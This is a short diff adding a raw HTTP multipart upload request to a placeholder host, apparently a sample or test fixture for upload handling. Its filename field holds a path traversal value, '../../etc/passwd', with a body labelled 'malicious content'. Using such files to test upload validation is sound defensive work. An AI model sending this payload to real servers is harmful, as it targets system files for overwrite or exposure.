@@ -1,0 +1,10 @@
+POST /api/upload HTTP/1.1
+Host: target.example.com
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+
+------WebKitFormBoundary
+Content-Disposition: form-data; name="file"; filename="../../etc/passwd"
+Content-Type: text/plain
+
+malicious content
+------WebKitFormBoundary--
